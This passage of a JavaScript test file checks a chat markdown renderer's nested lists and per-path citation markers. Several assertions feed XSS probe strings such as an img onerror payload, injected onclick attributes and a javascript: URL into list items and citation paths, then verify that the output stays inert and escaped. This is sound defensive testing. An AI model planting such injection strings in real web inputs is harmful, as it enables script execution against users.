  const c4 = renderMarkdown('1. first\n   - sub a\n   - sub b\n2. second');
  ok(c4 === '<ol><li>first<ul><li>sub a</li><li>sub b</li></ul></li><li>second</li></ol>',
    '§12d a nested bullet stays INSIDE its item — no more ol / ul / ol start=2 (C4)');
  ok(!/start=/.test(c4), '§12d …so the second item needs no start attribute');
  ok(renderMarkdown('- a\n  - b\n    - c\n- d') === '<ul><li>a<ul><li>b</li><li>c</li></ul></li><li>d</li></ul>',
    '§12d deeper indentation lands on the SAME nested level (one level is the grammar)');
  ok(renderMarkdown('- a\n  1. x\n  2. y') === '<ul><li>a<ol><li>x</li><li>y</li></ol></li></ul>',
    '§12d a nested list of the other type');
  ok(renderMarkdown('- a\n\t- b') === '<ul><li>a<ul><li>b</li></ul></li></ul>', '§12d a tab indents too');
  ok(renderMarkdown('- a\n - b') === '<ul><li>a</li><li>b</li></ul>',
    '§12d ONE space is not nesting (the threshold is 2)');
  ok(renderMarkdown('  - lone') === '<ul><li>lone</li></ul>', '§12d an indented item with no open list opens one');
  ok(renderMarkdown('1. item\n   continued here') === '<ol><li>item<br>continued here</li></ol>',
    '§12d an indented line under an item continues it');
  ok(renderMarkdown('1. item\ncontinued') === '<ol><li>item</li></ol><p>continued</p>',
    '§12d …an UNINDENTED one does not (lazy continuation stays unshipped — §11)');
  const quotes = renderMarkdown(
    '1. > "Leadership is the capacity to translate vision into reality."\n' +
    '   — Warren Bennis\n' +
    '2. > "Management is doing things right."\n' +
    '   — Peter Drucker');
  ok((quotes.match(/<ol/g) || []).length === 1 && (quotes.match(/<li>/g) || []).length === 2,
    '§12d THE "10 QUOTES" SHAPE: numbered quotes with an indented credit stay ONE list');
  ok((quotes.match(/<blockquote class="chat-md-quote">/g) || []).length === 2 &&
     (quotes.match(/<p class="chat-md-attrib">— /g) || []).length === 2,
    '§12d …each item a quote carrying its own attribution');
  const nx = renderMarkdown('- a\n  - <img src=x onerror=alert(1)>\n  > " onclick="y');
  ok(foreignTags372(nx).length === 0 && !hasLiveHandlerOrUrlAttr(nx) && balanced(nx, 'ul') && balanced(nx, 'li'),
    '§12d XSS in a nested item and a continuation quote: inert and balanced');
  const nol = renderMarkdown('- a\n  7" onmouseover="x. b\n  3. c');
  ok(!/\son\w+\s*=/.test(realTags(nol).join(' ')) && !/<ol start="[^"]*[^0-9"]/.test(nol),
    '§12d a nested <ol start> is digits only, never input text');
}

// ── §12e CITATIONS SPLIT INTO ONE MARKER PER PATH ─────────────────────────
{
  // No hook — every reader surface. One path: BYTE-IDENTICAL to before.
  const one = renderMarkdown('See [source: concepts/rag.md].');
  ok(one === '<p>See <span class="chat-citation-tag"><svg data-icon="dot" width="7"></svg>' +
    '<span class="chat-cite-path">concepts/rag.md</span></span>.</p>',
    '§12e no hook, one path: the legacy tag, byte-identical (the reader surfaces do not move)');
  const two = renderMarkdown('[source: a.md, b.md]');
  const paths = [...two.matchAll(/<span class="chat-cite-path">([^<]*)<\/span>/g)].map((m) => m[1]);
  ok(JSON.stringify(paths) === '["a.md","b.md"]', '§12e no hook, a comma list: ONE tag PER PATH (C5)');
  ok(!/a\.md, b\.md/.test(two), '§12e …and no tag holds the comma-joined string any more');

  // With a hook — the answer surface.
  const hk = mkHook();
  const h = renderMarkdown('Alpha [source: a.md, b.md] beta [source: a.md] gamma [source: c.md,b.md]', { cite: hk.cite });
  const nums = [...h.matchAll(/data-cite-n="(\d+)"/g)].map((m) => m[1]);
  ok(JSON.stringify(nums) === '["1","2","1","3","2"]', `§12e hooked: numbered by first appearance, repeats re-use (${nums.join(',')})`);
  ok((h.match(/<button type="button" class="chat-cite-n"/g) || []).length === 5,
    '§12e each marker is a real <button type="button"> — keyboard-reachable (C5)');
  ok(!/chat-citation-tag|chat-cite-path/.test(h), '§12e hooked: no legacy tag and no path hook class');
  const face = h.replace(/<span class="visually-hidden">[^<]*<\/span>/g, '').replace(/<[^>]*>/g, '');
  ok(!/\.md/.test(face), '§12e hooked: NO raw path on the visible face (only in visually-hidden text)');
  ok(/<span class="visually-hidden">Source 2: b\.md<\/span>/.test(h), '§12e …the path is in the marker\'s accessible name');
  ok(JSON.stringify(hk.order) === '["a.md","b.md","c.md"]', '§12e the hook saw each path, trimmed');
  const unexpected = attrNames(h).filter((a) => !HOOK_ATTRS.includes(a));
  ok(unexpected.length === 0, `§12e hooked output carries only fixed attributes (extra: ${unexpected.join(',') || 'none'})`);

  // The hook receives the RAW path (the L5 lesson) while the page shows it escaped.
  const amp = mkHook();
  const ah = renderMarkdown('[source: summaries/r&d-notes.md]', { cite: amp.cite });
  ok(amp.calls[0] === 'summaries/r&d-notes.md', '§12e the hook is handed the RAW path (`&`, not `&amp;`)');
  ok(ah.includes('r&amp;d-notes.md') && !ah.includes('&amp;amp;'), '§12e …and the page text is escaped exactly once');

  // THE BRIEF'S VECTOR: a wikilink inside the brackets.
  for (const cite of [mkHook(), null]) {
    const v = renderMarkdown('[source: a.md, [[b]]]', cite ? { cite: cite.cite } : undefined);
    ok(foreignTags372(v).length === 0 && !hasLiveHandlerOrUrlAttr(v) && balanced(v, 'span'),
      `§12e ${cite ? 'hooked' : 'no hook'} [source: a.md, [[b]]]: no foreign tag, no live attribute, spans balanced`);
    if (cite) {
      ok(cite.calls.length === 0, '§12e hooked: a capture holding markup is NEVER handed to the hook as a path');
      ok(!/<button/.test(v) && /chat-cite-unresolved/.test(v), '§12e hooked: …it renders inert, with no marker to open');
    }
  }
  // Hostile paths: escaped in the text, never an attribute.
  for (const v of ['[source: <img src=x onerror=alert(1)>.md]', '[source: a" onclick="alert(1), b.md]',
                   "[source: x' onfocus='y]", '[source: javascript:alert(1)]']) {
    const hh = mkHook();
    const out = renderMarkdown(v, { cite: hh.cite });
    ok(foreignTags372(out).length === 0 && !hasLiveHandlerOrUrlAttr(out),
      `§12e hooked XSS ${JSON.stringify(v.slice(0, 30))}: inert`);
    ok(attrNames(out).every((a) => HOOK_ATTRS.includes(a)) &&
       realTags(out).every((t) => !/data-cite-n="[^"]*[^0-9"]/.test(t)),
      '§12e …every data-cite-n value is digits only');
  }
  // The hook's return value is VALIDATED — only a positive integer reaches the attribute.
  for (const bad of ['1" onclick="x', -1, 0, 1.5, NaN, 1e6, '3', null, undefined, {}]) {
    const out = renderMarkdown('[source: p.md]', { cite: () => bad });
    ok(!/<button/.test(out) && /chat-cite-unresolved/.test(out) && !hasLiveHandlerOrUrlAttr(out),
      `§12e a hook returning ${JSON.stringify(bad) ?? String(bad)} yields NO marker (inert text)`);
  }
  // The citation pass stays LAST: §4's M1 vector, hooked.
  const m1 = renderMarkdown('[source: x[[y] tail]] rest of the document', { cite: mkHook().cite });
  ok(balanced(m1, 'span') && balanced(m1, 'button') && m1.includes('rest of the document'),
    '§12e M1 vector, hooked: balanced, nothing deleted');
  // A hook in a table cell, a heading, a quote and a list item all reach the citation pass.
  const every = mkHook();
  renderMarkdown('# H [source: h.md]\n\n| a |\n|---|\n| [source: t.md] |\n\n> q [source: q.md]\n\n- i [source: i.md]\n  - n [source: n.md]\n\npara [source: p.md]',
    { cite: every.cite });
  ok(JSON.stringify(every.order) === '["h.md","t.md","q.md","i.md","n.md","p.md"]',
    `§12e the hook reaches every block shape, in document order (${every.order.join(',')})`);
  ok(renderMarkdown('[source: , ]', { cite: mkHook().cite }) === '<p></p>',
    '§12e an empty citation emits no marker');
}

console.log(`\n${'─'.repeat(60)}`);
console.log(`Passed: ${passed}   Failed: ${failed}`);
if (failed > 0) { console.log('❌ FAILURES'); process.exit(1); }
console.log('✅ All /next markdown offline assertions green');
process.exit(0);
